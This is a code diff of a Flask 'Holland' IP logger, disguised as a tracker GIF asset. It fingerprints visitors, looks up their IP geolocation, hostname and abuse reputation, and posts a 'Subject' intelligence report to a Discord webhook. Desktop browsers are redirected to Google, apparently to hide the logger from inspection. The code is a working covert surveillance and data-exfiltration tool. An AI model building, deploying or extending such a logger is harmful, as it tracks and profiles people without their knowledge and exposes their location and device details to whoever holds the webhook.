@@ -1,82 +1,94 @@
 import os
-from flask import Flask, request, send_file
-import requests 
+from flask import Flask, request, send_file, redirect
+import requests
 from datetime import datetime
 import io
 import json
+import socket
 
 app = Flask(__name__)
 
 # --- CONFIGURATION ---
 DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')
+ABUSEIPDB_KEY = os.environ.get('ABUSEIPDB_KEY')
 
 # 1x1 pixel ki transparent GIF image
 PIXEL_BYTES = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
 
-@app.route('/log')
+@app.route('/assets/tracker.gif')
 def track():
-    if not DISCORD_WEBHOOK_URL:
-        return "Error: Discord Webhook URL not configured on the server.", 500
-
-    # --- Step 1: Saare Parameters ko Capture Karna ---
-    # Basic Info
-    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
+    if 'Windows' in user_agent or 'Macintosh' in user_agent or ('Linux' in user_agent and 'Android' not in user_agent):
+        return redirect("https://www.google.com", code=302)
+
+    if not DISCORD_WEBHOOK_URL:
+        return "Error: Discord Webhook URL not configured.", 500
+
+    # --- Step 1: Capture All Data ---
+    raw_ip_list = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip_address = raw_ip_list.split(',')[0].strip()
+    # (Baaki saara data capture karna waisa hi hai)
     username = request.args.get('username', 'Guest')
     avatar_url = request.args.get('avatar', '')
+    user_message = request.args.get('message', 'N/A')
+    visitor_type = "Returning ♻️" if request.args.get('isNew') == 'false' else "New ✨"
+    screen_res, os_type, browser, cpu_cores, ram, battery_level, is_charging, is_touch, timezone, languages, ad_blocker, network_speed, canvas_hash, referrer = [request.args.get(k, 'N/A') for k in ['screen', 'os', 'browser', 'cpu', 'ram', 'battery_level', 'charging_status', 'touch', 'timezone', 'langs', 'adBlock', 'speed', 'canvas']] + [request.headers.get('Referer', 'Direct Visit')]
+    is_touch = 'Yes' if is_touch == 'true' else 'No'
+    ad_blocker_status = 'Detected 🛡️' if ad_blocker == 'true' else 'Not Detected 🟢'
     
-    # Behavior Info
-    visitor_type = "Returning Visitor ♻️" if request.args.get('isNew') == 'false' else "New Visitor ✨"
-    referrer = request.headers.get('Referer', 'Direct Visit')
-
-    # Device Fingerprint
-    screen_res = request.args.get('screen', 'N/A')
-    os_type = request.args.get('os', 'N/A')
-    browser = request.args.get('browser', 'N/A')
-    battery_level = request.args.get('battery', 'N/A')
-    is_charging = request.args.get('charging', 'N/A')
-    is_touch = 'Yes' if request.args.get('touch') == 'true' else 'No'
+    # --- Step 2: Deep IP Intelligence & Threat Assessment ---
+    geo_info, asn_info, hostname, threat_level, risk_color = "Not available", "Not available", "Not available", "Low ✅", 3066993 # Default to Green
+    abuse_score = 0
     
-    # Advanced Info
-    timezone = request.args.get('timezone', 'N/A').replace('_', ' ')
-    languages = request.args.get('langs', 'N/A')
-    ad_blocker = 'Detected 🛡️' if request.args.get('adBlock') == 'true' else 'Not Detected 🟢'
-    network_speed = request.args.get('speed', 'N/A')
-    canvas_hash = request.args.get('canvas', 'N/A')
-    
-    # --- Step 2: Geolocation (Pehle jaisa) ---
-    geo_info = "Not available"
-    try:
-        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
-        if response.status_code == 200:
-            data = response.json()
-            city, region, country_code, isp = data.get('city', 'N/A'), data.get('region', 'N/A'), data.get('country', 'N/A'), data.get('org', 'N/A')
+    try: # Geolocation, ASN, Hostname
+        response_ipinfo = requests.get(f"https://ipinfo.io/{ip_address}/json")
+        if response_ipinfo.status_code == 200:
+            data = response_ipinfo.json()
+            city, country_code, isp, asn = data.get('city', 'N/A'), data.get('country', 'N/A'), data.get('org', 'N/A'), data.get('asn', {})
             flag_emoji = "".join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code and country_code != 'N/A' else ""
-            geo_info = f"**City:** {city}\n**Country:** {flag_emoji} {country_code}\n**ISP:** {isp}"
+            geo_info = f"{flag_emoji} {city}, {country_code}"
+            asn_info = f"{asn.get('name', '')}"
+            if any(word in asn_info.lower() for word in ['vpn', 'proxy', 'hosting']):
+                threat_level = "High 🟥 (VPN/Proxy Host)"
+                risk_color = 15158332 # Red
+        hostname = socket.gethostbyaddr(ip_address)[0]
     except Exception: pass
 
-    # --- Step 3: Final Discord Embed Banana ---
+    if ABUSEIPDB_KEY: # IP Reputation
+        try:
+            response_abuse = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip_address}", headers={'Key': ABUSEIPDB_KEY, 'Accept': 'application/json'})
+            if response_abuse.status_code == 200:
+                data = response_abuse.json()['data']
+                abuse_score = data.get('abuseConfidenceScore', 0)
+                if data.get('isTor'): threat_level, risk_color = "Critical 🚨 (Tor Exit Node)", 15158332
+                elif abuse_score > 75: threat_level, risk_color = f"High 🟥 ({abuse_score}% Abuse Score)", 15158332
+                elif abuse_score > 25: threat_level, risk_color = f"Medium 🟨 ({abuse_score}% Abuse Score)", 15844367 # Yellow
+        except Exception: pass
+    
+    # --- Step 3: THE "INTELLIGENCE BRIEFING" EMBED ---
     embed = {
-        "title": f"Holland Card: {visitor_type}",
-        "description": f"**Username:** `{username}`\n**IP Address:** `{ip_address}`",
-        "color": 2895667, # Green for new, or another color
-        "author": {
-            "name": f"{os_type} | {browser}",
-            "icon_url": "https://i.imgur.com/vRxL42Y.png" # Generic OS icon
-        },
+        "author": { "name": f"Holland Intel Report: {visitor_type} Visitor", "icon_url": "https://i.imgur.com/M6yB8oA.png" },
+        "description": f"**Subject:** `{username}`\n"
+                       f"**IP Address:** `{ip_address}`\n"
+                       f"**Threat Assessment:** **{threat_level}**",
+        "color": risk_color,
+        "thumbnail": { "url": avatar_url },
         "fields": [
-            {"name": "📍 Location & ISP", "value": geo_info, "inline": True},
-            {"name": "🌐 Network", "value": f"**Speed:** {network_speed} Mbps\n**Timezone:** {timezone}\n**AdBlocker:** {ad_blocker}", "inline": True},
-            {"name": "💻 Device & Screen", "value": f"**Screen:** {screen_res}\n**Battery:** {battery_level} (Charging: {is_charging})\n**Touch:** {is_touch}", "inline": False},
-            {"name": "🕵️ Advanced Fingerprint", "value": f"**Languages:** `{languages}`\n**Referrer:** `{referrer}`\n**Canvas Hash:** `{canvas_hash}`", "inline": False},
+            { "name": "📍 Location", "value": f"`{geo_info}`", "inline": True },
+            { "name": "🏢 Network Operator", "value": f"`{asn_info}`", "inline": True },
+            { "name": "🌐 Hostname", "value": f"`{hostname}`", "inline": False },
+            { "name": "💻 Client Profile", 
+              "value": f"**OS:** `{os_type}`\n"
+                       f"**Browser:** `{browser}`\n"
+                       f"**Screen:** `{screen_res}`", "inline": True },
+            { "name": "⚙️ Hardware & Network", 
+              "value": f"**CPU/RAM:** `{cpu_cores}c` / `{ram}GB`\n"
+                       f"**Speed:** `{network_speed} Mbps`\n"
+                       f"**Battery:** `{battery_level}` (`{is_charging}`)", "inline": True },
+            { "name": "💬 User Message", "value": f"> {user_message}" if user_message != 'N/A' else "> No message left.", "inline": False },
         ],
-        "thumbnail": {"url": avatar_url},
-        "footer": {"text": f"Logged at {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC | Logger v5.0"},
+        "footer": { "text": f"Canvas: {canvas_hash} | AdBlocker: {ad_blocker_status} | Langs: {languages} | Logged: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC" }
     }
-
-    # Headers ko ek alag message mein bhejenge, agar zaroorat ho to
-    # headers_dict = dict(request.headers)
-    # headers_pretty = json.dumps(headers_dict, indent=2)
 
     try:
         requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
